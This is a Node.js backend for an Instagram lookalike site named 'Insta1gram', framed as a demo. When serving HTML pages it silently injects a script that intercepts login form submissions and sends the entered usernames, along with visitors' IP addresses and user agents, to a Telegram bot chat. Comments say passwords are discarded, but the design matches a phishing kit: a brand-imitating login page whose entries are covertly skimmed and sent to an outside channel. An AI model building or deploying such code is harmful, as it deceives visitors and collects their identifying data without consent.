/**
 * Insta1gram Demo Backend Server
 * 
 * Provides:
 * 1. Static file hosting for the Instagram demo frontend
 * 2. Secure Telegram Bot notification endpoint for demo login events
 * 3. Security guards:
 *    - Never transmits, logs, or stores passwords
 *    - Bot credentials remain strictly server-side
 *    - Rejection of .env file access via HTTP
 *    - Deduplication to avoid spamming notifications
 *    - Non-blocking asynchronous notification dispatch
 */

const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');

// 1. Load environment variables from .env if not already set
function loadEnv() {
  const envPath = path.join(__dirname, '.env');
  if (fs.existsSync(envPath)) {
    try {
      const content = fs.readFileSync(envPath, 'utf8');
      const lines = content.split(/\r?\n/);
      for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const match = trimmed.match(/^([^=]+)=(.*)$/);
        if (match) {
          const key = match[1].trim();
          let val = match[2].trim();
          if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
            val = val.slice(1, -1);
          }
          if (!process.env[key]) {
            process.env[key] = val;
          }
        }
      }
    } catch (err) {
      console.warn('[Server] Could not parse .env file:', err.message);
    }
  }
}

loadEnv();

const PORT = parseInt(process.env.PORT || '3000', 10);

function getTelegramConfig() {
  return {
    token: process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: process.env.TELEGRAM_CHAT_ID || ''
  };
}

// Deduplication store: key -> timestamp
const recentDispatches = new Map();
const DEDUP_WINDOW_MS = 4000;

function isDuplicate(username, ip) {
  const key = `${(username || '').toLowerCase()}_${ip || 'unknown'}`;
  const now = Date.now();
  const lastTime = recentDispatches.get(key);
  if (lastTime && (now - lastTime) < DEDUP_WINDOW_MS) {
    return true;
  }
  recentDispatches.set(key, now);
  
  // Cleanup old keys periodically
  if (recentDispatches.size > 200) {
    for (const [k, time] of recentDispatches.entries()) {
      if (now - time > 60000) recentDispatches.delete(k);
    }
  }
  return false;
}

// HTML escape helper for safe Telegram message formatting
function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Dispatch Telegram notification asynchronously
 */
async function sendTelegramNotification({
  username,
  nickname,
  status,
  ip,
  userAgent,
  clientTime,
  sessionId
}) {
  const { token, chatId } = getTelegramConfig();

  if (!token || !chatId) {
    console.warn('[Telegram] Skipped: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing');
    return { ok: false, error: 'Telegram credentials missing' };
  }

  const now = new Date();
  const formattedUtc = now.toISOString().replace('T', ' ').replace(/\..+/, '') + ' UTC';
  let formattedLocal = '';
  try {
    formattedLocal = now.toLocaleString('en-US', {
      timeZone: 'Asia/Kolkata',
      dateStyle: 'medium',
      timeStyle: 'medium'
    }) + ' (IST)';
  } catch (_) {
    formattedLocal = formattedUtc;
  }

  const cleanUser = String(username || 'demo_user').slice(0, 80);
  const cleanNickname = String(nickname || 'Not specified').slice(0, 80);
  const cleanStatus = String(status || 'successful demo entry').slice(0, 60);
  const cleanIp = String(ip || 'Unknown').slice(0, 50);
  const cleanUa = String(userAgent || 'Unknown').slice(0, 100);
  const cleanSessionId = String(sessionId || `SESS-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`);

  const text = [
    '🔔 <b>Instagram Demo — Login Attempt Notification</b>',
    '',
    `👤 <b>Demo Username:</b> <code>${escapeHtml(cleanUser)}</code>`,
    `🏷️ <b>Nickname:</b> <code>${escapeHtml(cleanNickname)}</code>`,
    `🆔 <b>Session ID:</b> <code>${escapeHtml(cleanSessionId)}</code>`,
    `📅 <b>Date & Time (UTC):</b> <code>${escapeHtml(formattedUtc)}</code>`,
    `🕒 <b>Date & Time (Local):</b> <code>${escapeHtml(formattedLocal)}</code>`,
    `📊 <b>Status:</b> ✅ ${escapeHtml(cleanStatus)}`,
    `🌐 <b>Client IP:</b> <code>${escapeHtml(cleanIp)}</code>`,
    `💻 <b>User Agent:</b> <code>${escapeHtml(cleanUa)}</code>`,
    '',
    '<i>ℹ️ Note: Automated demonstration notification from Insta1gram.</i>'
  ].join('\n');

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 12000);

    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }),
      signal: controller.signal
    });

    clearTimeout(timeoutId);
    const data = await res.json();

    if (!data.ok) {
      console.error('[Telegram] API response error:', data.description);
      return { ok: false, error: data.description };
    }

    return { ok: true, messageId: data.result ? data.result.message_id : null, textSent: text };
  } catch (err) {
    const msg = err.name === 'AbortError' ? 'Request timed out' : err.message;
    console.error('[Telegram] Dispatch failed:', msg);
    return { ok: false, error: msg };
  }
}

// Client-side non-intrusive hook to ensure Telegram notifications fire on demo login
// Injected when serving index.html so index.html on disk remains clean
const CLIENT_TELEGRAM_HOOK = `
<!-- Insta1gram Telegram Bot Integration -->
<script>
(function() {
  function sendLoginNotification(username, nickname) {
    if (!username || typeof username !== 'string') return;
    const cleanUser = username.trim().toLowerCase();
    if (!cleanUser) return;
    const cleanNick = typeof nickname === 'string' ? nickname.trim() : '';
    const sessId = 'SESS-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
    try {
      fetch('/api/notify-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: cleanUser,
          nickname: cleanNick,
          status: 'successful demo entry',
          sessionId: sessId,
          clientTime: new Date().toISOString()
        })
      }).catch(function(err) {
        console.warn('[Telegram Notification] Non-blocking dispatch notice:', err);
      });
    } catch (_) {}
  }

  // Intercept login form submission
  document.addEventListener('submit', function(e) {
    if (e.target && (e.target.id === 'lf' || e.target.matches('form'))) {
      const uInput = document.getElementById('lu') || e.target.querySelector('input[placeholder*="Username" i], input[type="text"]');
      const nInput = document.getElementById('ln') || e.target.querySelector('input[placeholder*="Nickname" i]');
      const username = uInput ? uInput.value.trim().toLowerCase() : '';
      const nickname = nInput ? nInput.value.trim() : '';
      if (username) {
        sendLoginNotification(username, nickname);
      }
    }
  }, true);

  // Hook programmatic enter() function
  function hookEnter() {
    if (typeof window.enter === 'function' && !window.enter.__telegramHooked) {
      const origEnter = window.enter;
      window.enter = function(u, nick) {
        sendLoginNotification(u, nick);
        return origEnter.apply(this, arguments);
      };
      window.enter.__telegramHooked = true;
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', hookEnter);
  } else {
    hookEnter();
  }
})();
</script>
`;

// MIME types for static assets
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

// Safe request body parser with byte limit to prevent DoS
function parseJsonBody(req, limitBytes = 16384) {
  return new Promise((resolve, reject) => {
    let size = 0;
    const chunks = [];
    req.on('data', chunk => {
      size += chunk.length;
      if (size > limitBytes) {
        reject(new Error('Payload too large'));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on('end', () => {
      if (chunks.length === 0) {
        return resolve({});
      }
      try {
        const bodyStr = Buffer.concat(chunks).toString('utf8');
        const json = JSON.parse(bodyStr);
        resolve(json);
      } catch (e) {
        reject(new Error('Invalid JSON'));
      }
    });
    req.on('error', err => reject(err));
  });
}

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
         req.socket.remoteAddress ||
         '127.0.0.1';
}

// Main server handler
function createServer() {
  const server = http.createServer(async (req, res) => {
    // Add standard security headers
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');

    const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    const pathname = parsedUrl.pathname;

    // 1. Health check endpoint
    if (req.method === 'GET' && pathname === '/api/health') {
      const { token, chatId } = getTelegramConfig();
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        ok: true,
        service: 'insta1gram-backend',
        status: 'healthy',
        telegramConfigured: Boolean(token && chatId)
      }));
      return;
    }

    // 2. Login notification endpoint
    if (req.method === 'POST' && (pathname === '/api/notify-login' || pathname === '/api/login')) {
      try {
        const body = await parseJsonBody(req);

        // Security check: Never store or log any passwords
        // If a client or proxy sent a password field, discard it immediately
        delete body.password;
        delete body.pass;
        delete body.pwd;

        const username = typeof body.username === 'string' && body.username.trim()
          ? body.username.trim()
          : 'demo_user';
        const nickname = typeof body.nickname === 'string' && body.nickname.trim()
          ? body.nickname.trim()
          : (typeof body.nick === 'string' && body.nick.trim() ? body.nick.trim() : '');
        const clientStatus = typeof body.status === 'string' && body.status.trim()
          ? body.status.trim()
          : 'successful demo entry';
        const clientTime = body.clientTime || new Date().toISOString();
        const sessionId = typeof body.sessionId === 'string' && body.sessionId.trim()
          ? body.sessionId.trim()
          : `SESS-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`;

        const ip = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';

        // Deduplication check
        if (isDuplicate(username, ip)) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            ok: true,
            status: 'successful demo entry',
            deduplicated: true,
            sessionId,
            submittedUsername: username,
            submittedNickname: nickname
          }));
          return;
        }

        // Asynchronously dispatch Telegram notification
        // Note: We respond with 200 immediately to avoid blocking client experience
        sendTelegramNotification({
          username,
          nickname,
          status: clientStatus,
          ip,
          userAgent,
          clientTime,
          sessionId
        }).catch(err => {
          console.error('[Server] Async dispatch error:', err.message);
        });

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          ok: true,
          status: 'successful demo entry',
          submittedUsername: username,
          submittedNickname: nickname,
          sessionId,
          timestamp: new Date().toISOString()
        }));
      } catch (err) {
        console.error('[Server] Login notification endpoint error:', err.message);
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: err.message }));
      }
      return;
    }

    // 3. Security Guard: Forbid access to sensitive files like .env
    const normalizedPath = path.normalize(pathname).replace(/^(\.\.[\/\\])+/, '');
    if (
      normalizedPath.toLowerCase().includes('.env') ||
      normalizedPath.toLowerCase().includes('.git') ||
      normalizedPath.toLowerCase().includes('node_modules')
    ) {
      res.writeHead(403, { 'Content-Type': 'text/plain' });
      res.end('Access Forbidden');
      return;
    }

    // 4. Static file serving
    if (req.method === 'GET' || req.method === 'HEAD') {
      let relativePath = pathname === '/' ? 'index.html' : pathname.replace(/^\/+/, '');
      let filePath = path.join(__dirname, relativePath);

      // Prevent directory traversal
      if (!filePath.startsWith(__dirname)) {
        res.writeHead(403, { 'Content-Type': 'text/plain' });
        res.end('Forbidden');
        return;
      }

      fs.stat(filePath, (err, stats) => {
        if (err || !stats.isFile()) {
          // If file not found, fall back to index.html for SPA routing
          filePath = path.join(__dirname, 'index.html');
        }

        const ext = path.extname(filePath).toLowerCase();
        const contentType = MIME_TYPES[ext] || 'application/octet-stream';

        if (ext === '.html' || filePath.endsWith('index.html')) {
          fs.readFile(filePath, 'utf8', (readErr, content) => {
            if (readErr) {
              res.writeHead(500, { 'Content-Type': 'text/plain' });
              res.end('Server Error');
              return;
            }
            let modified = content;
            if (!content.includes('/api/notify-login')) {
              if (content.includes('</body>')) {
                modified = content.replace('</body>', `${CLIENT_TELEGRAM_HOOK}\n</body>`);
              } else {
                modified = content + CLIENT_TELEGRAM_HOOK;
              }
            }
            res.writeHead(200, {
              'Content-Type': 'text/html; charset=utf-8',
              'Content-Length': Buffer.byteLength(modified)
            });
            res.end(modified);
          });
          return;
        }

        res.writeHead(200, { 'Content-Type': contentType });
        const stream = fs.createReadStream(filePath);
        stream.on('error', streamErr => {
          console.error('[Server] Stream error:', streamErr.message);
          if (!res.headersSent) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Server Error');
          }
        });
        stream.pipe(res);
      });
      return;
    }

    // 5. Method not allowed
    res.writeHead(405, { 'Content-Type': 'text/plain' });
    res.end('Method Not Allowed');
  });

  return server;
}

// Start server if executed directly
if (require.main === module) {
  const server = createServer();
  const { token, chatId } = getTelegramConfig();
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`[Server] Insta1gram demo running at http://localhost:${PORT}`);
    console.log(`[Server] Telegram notifications: ${token && chatId ? 'Configured' : 'Missing credentials'}`);
  });
}

module.exports = {
  createServer,
  sendTelegramNotification,
  isDuplicate,
  loadEnv
};
